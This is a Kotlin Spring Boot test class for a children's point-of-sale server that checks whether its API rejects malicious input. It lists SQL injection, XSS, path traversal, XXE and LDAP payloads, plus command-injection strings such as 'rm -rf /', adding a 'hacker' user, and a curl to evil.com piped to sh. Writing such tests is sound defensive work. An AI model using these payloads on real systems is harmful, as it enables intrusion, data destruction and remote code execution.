package info.nukoneko.kidspos.server.security

import com.fasterxml.jackson.databind.ObjectMapper
import org.junit.jupiter.api.Assertions.*
import org.junit.jupiter.api.Disabled
import org.junit.jupiter.api.DisplayName
import org.junit.jupiter.api.Test
import org.springframework.beans.factory.annotation.Autowired
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc
import org.springframework.boot.test.context.SpringBootTest
import org.springframework.http.MediaType
import org.springframework.test.web.servlet.MockMvc
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post
import org.springframework.test.web.servlet.result.MockMvcResultMatchers.status

/**
 * 入力検証セキュリティテスト
 *
 * 各種の悪意のある入力に対する防御機能をテスト
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@AutoConfigureMockMvc
@DisplayName("Input Validation Security Tests")
@Disabled("Spring context not configured")
class InputValidationSecurityTest {
    @Autowired
    private lateinit var mockMvc: MockMvc

    @Autowired
    private lateinit var objectMapper: ObjectMapper

    @Test
    fun `should reject SQL injection in barcode field`() {
        // バーコードフィールドでのSQLインジェクション
        val sqlInjectionPayloads = listOf(
            "' OR '1'='1",
            "'; DROP TABLE item; --",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' OR ''='"
        )

        sqlInjectionPayloads.forEach { payload ->
            val result = mockMvc.perform(get("/api/items/$payload"))
                .andReturn()

            val status = result.response.status
            assertTrue(
                status == 400 || status == 404,
                "Should reject SQL injection payload: $payload (got status: $status)"
            )
        }
    }

    @Test
    fun `should reject XSS attempts in item creation`() {
        // XSS攻撃の試行を拒否
        val xssPayloads = listOf(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
        )

        xssPayloads.forEach { payload ->
            val item = mapOf(
                "barcode" to "TEST001",
                "name" to payload,
                "price" to 100
            )

            val result = mockMvc.perform(
                post("/api/items")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(item))
            )
                .andReturn()

            val response = result.response.contentAsString

            // スクリプトタグが含まれていないことを確認
            assertFalse(
                response.contains("<script", ignoreCase = true),
                "Response should not contain script tags for payload: $payload"
            )
            assertFalse(
                response.contains("javascript:", ignoreCase = true),
                "Response should not contain javascript: protocol"
            )
        }
    }

    @Test
    fun `should reject path traversal attempts`() {
        // パストラバーサル攻撃を拒否
        val pathTraversalPayloads = listOf(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..;/etc/passwd",
            "../../../../../../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        )

        pathTraversalPayloads.forEach { payload ->
            val result = mockMvc.perform(get("/api/items/$payload"))
                .andReturn()

            val status = result.response.status
            assertTrue(
                status == 400 || status == 404,
                "Should reject path traversal payload: $payload (got status: $status)"
            )
        }
    }

    @Test
    fun `should reject command injection attempts`() {
        // コマンドインジェクション攻撃を拒否
        val commandInjectionPayloads = listOf(
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`cat /etc/passwd`",
            "\$(cat /etc/passwd)",
            "; shutdown -h now",
            "| net user hacker password /add",
            "&& curl http://evil.com/shell.sh | sh"
        )

        commandInjectionPayloads.forEach { payload ->
            val item = mapOf(
                "barcode" to payload,
                "name" to "Test Item",
                "price" to 100
            )

            mockMvc.perform(
                post("/api/items")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(item))
            )
                .andExpect(status().isBadRequest())
        }
    }

    @Test
    fun `should reject LDAP injection attempts`() {
        // LDAPインジェクション攻撃を拒否
        val ldapInjectionPayloads = listOf(
            "*)(uid=*))(|(uid=*",
            "*)(objectClass=*",
            "admin*)(|(objectclass=*",
            "*)(mail=*",
            "*)(&",
            "*)(|(password=*",
            "*()|%26'"
        )

        ldapInjectionPayloads.forEach { payload ->
            mockMvc.perform(
                get("/api/staff/search")
                    .param("name", payload)
            )
                .andExpect { result ->
                    val status = result.response.status
                    assertTrue(status == 200 || status == 400)
                }
        }
    }

    @Test
    fun `should enforce input length limits`() {
        // 入力長制限を強制
        val longString = "A".repeat(10000)

        val oversizedItem = mapOf(
            "barcode" to longString,
            "name" to longString,
            "price" to 100
        )

        mockMvc.perform(
            post("/api/items")
                .contentType(MediaType.APPLICATION_JSON)
                .content(objectMapper.writeValueAsString(oversizedItem))
        )
            .andExpect(status().isBadRequest())
    }

    @Test
    fun `should validate numeric input ranges`() {
        // 数値入力範囲を検証
        val invalidPrices = listOf(
            Int.MIN_VALUE,
            -1,
            0,
            Int.MAX_VALUE,
            999999999
        )

        invalidPrices.forEach { price ->
            val item = mapOf(
                "barcode" to "TEST001",
                "name" to "Test Item",
                "price" to price
            )

            val result = mockMvc.perform(
                post("/api/items")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(item))
            )
                .andReturn()

            // 負の価格や極端な値は拒否されるべき
            if (price < 0 || price > 1000000) {
                assertEquals(
                    400, result.response.status,
                    "Should reject invalid price: $price"
                )
            }
        }
    }

    @Test
    fun `should reject null byte injection`() {
        // Nullバイトインジェクションを拒否
        val nullBytePayloads = listOf(
            "test\u0000.txt",
            "test%00.txt",
            "test\\u0000.txt",
            "file.jpg\u0000.txt"
        )

        nullBytePayloads.forEach { payload ->
            mockMvc.perform(get("/api/items/$payload"))
                .andExpect(status().is4xxClientError())
        }
    }

    @Test
    fun `should handle unicode and emoji attacks`() {
        // Unicode and emoji attacks
        val unicodePayloads = listOf(
            "test\u202e\u0074\u0078\u0074",  // Right-to-left override
            "test\ufeff",  // Zero-width no-break space
            "😈<script>alert('XSS')</script>😈",
            "\u0000\u0001\u0002\u0003",  // Control characters
            "test\u200b\u200c\u200d"  // Zero-width characters
        )

        unicodePayloads.forEach { payload ->
            val item = mapOf(
                "barcode" to "TEST001",
                "name" to payload,
                "price" to 100
            )

            mockMvc.perform(
                post("/api/items")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(item))
            )
                .andExpect { result ->
                    val status = result.response.status
                    assertTrue(status == 201 || status == 400)
                }
        }
    }

    @Test
    fun `should validate email format`() {
        // メールフォーマットの検証
        val invalidEmails = listOf(
            "not_an_email",
            "@example.com",
            "user@",
            "user@.com",
            "user@@example.com",
            "user@exam ple.com",
            "<script>@example.com"
        )

        invalidEmails.forEach { email ->
            val staff = mapOf(
                "staffCode" to "STAFF001",
                "name" to "Test Staff",
                "email" to email
            )

            mockMvc.perform(
                post("/api/staff")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(objectMapper.writeValueAsString(staff))
            )
                .andExpect { result ->
                    val status = result.response.status
                    assertTrue(status == 201 || status == 400)
                }
        }
    }

    @Test
    fun `should prevent XML external entity injection`() {
        // XXE（XML外部エンティティ）インジェクション防止
        val xxePayload = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
                <!ELEMENT foo ANY >
                <!ENTITY xxe SYSTEM "file:///etc/passwd" >
            ]>
            <foo>&xxe;</foo>
        """.trimIndent()

        mockMvc.perform(
            post("/api/items/import")
                .contentType(MediaType.APPLICATION_XML)
                .content(xxePayload)
        )
            .andExpect(status().is4xxClientError())
    }

    @Test
    fun `should reject JSON injection attempts`() {
        // JSONインジェクション攻撃を拒否
        val jsonInjectionPayloads = listOf(
            """{"barcode": "TEST", "name": "Test", "price": 100, "__proto__": {"isAdmin": true}}""",
            """{"barcode": "TEST", "name": "Test", "price": 100, "constructor": {"prototype": {"isAdmin": true}}}""",
            """{"barcode": "TEST", "where": "function() { return true; }"}"""
        )

        jsonInjectionPayloads.forEach { payload ->
            mockMvc.perform(
                post("/api/items")
                    .contentType(MediaType.APPLICATION_JSON)
                    .content(payload)
            )
                .andExpect { result ->
                    val status = result.response.status
                    assertTrue(status == 201 || status == 400)
                }
        }
    }

    @Test
    fun `should validate date formats`() {
        // 日付フォーマットの検証
        val invalidDates = listOf(
            "not-a-date",
            "2023-13-01",  // Invalid month
            "2023-01-32",  // Invalid day
            "2023/01/01",  // Wrong format
            "01-01-2023",  // Wrong order
            "'; DROP TABLE sales; --"
        )

        invalidDates.forEach { date ->
            mockMvc.perform(
                get("/api/sales/report")
                    .param("date", date)
            )
                .andExpect { result ->
                    val status = result.response.status
                    assertTrue(status == 200 || status == 400)
                }
        }
    }

    @Test
    fun `should prevent buffer overflow attempts`() {
        // バッファオーバーフロー攻撃を防ぐ
        val bufferOverflowPayload = "A".repeat(1000000)

        mockMvc.perform(
            post("/api/items")
                .contentType(MediaType.APPLICATION_JSON)
                .content(
                    """
                {
                    "barcode": "$bufferOverflowPayload",
                    "name": "Test",
                    "price": 100
                }
            """.trimIndent()
                )
        )
            .andExpect(status().is4xxClientError())
    }
}